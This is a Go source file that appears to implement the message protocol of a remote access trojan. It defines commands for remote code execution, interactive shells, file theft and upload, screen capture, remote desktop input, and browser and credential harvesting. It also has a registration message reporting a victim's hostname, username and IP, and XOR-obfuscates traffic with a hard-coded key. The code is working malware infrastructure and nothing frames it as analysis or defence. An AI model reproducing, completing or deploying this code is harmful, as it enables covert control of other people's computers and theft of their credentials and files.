package protocol

import (
	"encoding/binary"
	"errors"
	"io"
)

const (
	Magic0     byte = 0xA1
	Magic1     byte = 0xB7
	MaxPayload      = 2097152
)

type Type uint16

const (
	CmdPing        Type = 0x01
	CmdExec        Type = 0x02
	CmdQuit        Type = 0x03
	CmdRegister    Type = 0x10
	CmdHeartbeat   Type = 0x11
	CmdFsLs        Type = 0x20
	CmdFsGet       Type = 0x21
	CmdScreen      Type = 0x22
	CmdDeskOn      Type = 0x23
	CmdDeskOff     Type = 0x24
	CmdInput       Type = 0x25
	CmdShellOn     Type = 0x26
	CmdShellIn     Type = 0x27
	CmdShellOff    Type = 0x28
	CmdFsPut       Type = 0x29
	CmdFsDel       Type = 0x2A
	CmdFsMkdir     Type = 0x2B
	CmdFsRen       Type = 0x2C
	CmdBrowser     Type = 0x2D
	CmdCreds       Type = 0x2E
	CmdBrowserDeep Type = 0x2F
	RspData        Type = 0x81
	RspShell       Type = 0x84
	RspFrame       Type = 0x85
	RspErr         Type = 0x82
	RspEnd         Type = 0x83
	RspOK          Type = 0x90
)

var XKey = [32]byte{
	0x2C, 0x91, 0x4F, 0xE6, 0x03, 0xAA, 0x7D, 0x18,
	0xB5, 0x62, 0xCF, 0x34, 0xE9, 0x8A, 0x51, 0x0D,
	0xF6, 0x23, 0x78, 0xAC, 0x41, 0x9E, 0x07, 0xDC,
	0x65, 0x38, 0x90, 0x4B, 0x12, 0xF9, 0x06, 0xB3,
}

var (
	ErrMagic    = errors.New("bad magic")
	ErrTooBig   = errors.New("payload too large")
	ErrShort    = errors.New("short buffer")
	ErrRegister = errors.New("bad register payload")
)

func Crypt(dst []byte, typ Type) {
	seed := int(typ)
	for i := range dst {
		dst[i] ^= XKey[(i+seed)&31]
	}
}

type Frame struct {
	Type    Type
	Payload []byte
}

func Encode(typ Type, payload []byte) []byte {
	if payload == nil {
		payload = []byte{}
	}
	out := make([]byte, 8+len(payload))
	out[0] = Magic0
	out[1] = Magic1
	binary.LittleEndian.PutUint16(out[2:4], uint16(typ))
	binary.LittleEndian.PutUint32(out[4:8], uint32(len(payload)))
	copy(out[8:], payload)
	Crypt(out[8:], typ)
	return out
}

func Decode(r io.Reader) (Frame, error) {
	var hdr [8]byte
	if _, err := io.ReadFull(r, hdr[:]); err != nil {
		return Frame{}, err
	}
	if hdr[0] != Magic0 || hdr[1] != Magic1 {
		return Frame{}, ErrMagic
	}
	typ := Type(binary.LittleEndian.Uint16(hdr[2:4]))
	plen := int(binary.LittleEndian.Uint32(hdr[4:8]))
	if plen < 0 || plen > MaxPayload {
		return Frame{}, ErrTooBig
	}
	payload := make([]byte, plen)
	if plen > 0 {
		if _, err := io.ReadFull(r, payload); err != nil {
			return Frame{}, err
		}
		Crypt(payload, typ)
	}
	return Frame{Type: typ, Payload: payload}, nil
}

type Register struct {
	Ver      uint8
	PID      uint32
	Hostname string
	Username string
	OS       string
	Arch     string
	IP       string
}

func putStr(buf []byte, s string) []byte {
	if len(s) > 0xffff {
		s = s[:0xffff]
	}
	var ln [2]byte
	binary.LittleEndian.PutUint16(ln[:], uint16(len(s)))
	buf = append(buf, ln[:]...)
	return append(buf, s...)
}

func takeStr(b []byte) (string, []byte, error) {
	if len(b) < 2 {
		return "", nil, ErrRegister
	}
	n := int(binary.LittleEndian.Uint16(b[:2]))
	b = b[2:]
	if n > len(b) {
		return "", nil, ErrRegister
	}
	return string(b[:n]), b[n:], nil
}

func (r Register) Marshal() []byte {
	if r.Ver == 0 {
		r.Ver = 1
	}
	buf := make([]byte, 0, 64)
	buf = append(buf, r.Ver)
	var pid [4]byte
	binary.LittleEndian.PutUint32(pid[:], r.PID)
	buf = append(buf, pid[:]...)
	buf = putStr(buf, r.Hostname)
	buf = putStr(buf, r.Username)
	buf = putStr(buf, r.OS)
	buf = putStr(buf, r.Arch)
	buf = putStr(buf, r.IP)
	return buf
}

func ParseRegister(b []byte) (Register, error) {
	var r Register
	if len(b) < 5 {
		return r, ErrRegister
	}
	r.Ver = b[0]
	r.PID = binary.LittleEndian.Uint32(b[1:5])
	rest := b[5:]
	var err error
	if r.Hostname, rest, err = takeStr(rest); err != nil {
		return r, err
	}
	if r.Username, rest, err = takeStr(rest); err != nil {
		return r, err
	}
	if r.OS, rest, err = takeStr(rest); err != nil {
		return r, err
	}
	if r.Arch, rest, err = takeStr(rest); err != nil {
		return r, err
	}
	if r.IP, rest, err = takeStr(rest); err != nil {
		return r, err
	}
	return r, nil
}
